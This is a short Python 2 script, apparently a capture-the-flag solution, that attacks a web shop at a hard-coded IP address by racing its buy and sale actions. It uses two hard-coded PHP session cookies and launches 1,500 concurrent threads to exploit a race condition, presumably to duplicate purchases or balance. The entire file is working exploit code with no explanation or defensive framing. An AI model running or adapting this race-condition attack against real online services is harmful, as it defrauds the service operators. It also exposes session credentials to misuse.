# -*- coding:utf-8 -*-

import requests
import threading

def buy(cookies):
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cookie": "PHPSESSID="+cookies,
               "Connection": "keep-alive"}
    r = requests.get("http://202.120.7.197/app.php?action=buy&id=2", headers=headers)
    print r.content

def sale(cookies):
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cookie": "PHPSESSID="+cookies,
               "Connection": "keep-alive"}
    r = requests.get("http://202.120.7.197/app.php?action=sale&id=2", headers=headers)
    print r.content

cookies_1 = "1jhhcgb4iklncmoc619fe51260"
cookies_2 = "97ffp79uamrrh1thi7d0727p13"
for i in range(0,300):
    threading.Thread(target=buy,args = (cookies_1,)).start()
    threading.Thread(target=sale,args = (cookies_2,)).start()
    threading.Thread(target=buy,args = (cookies_1,)).start()
    threading.Thread(target=buy,args = (cookies_2,)).start()
    threading.Thread(target=sale,args = (cookies_1,)).start()
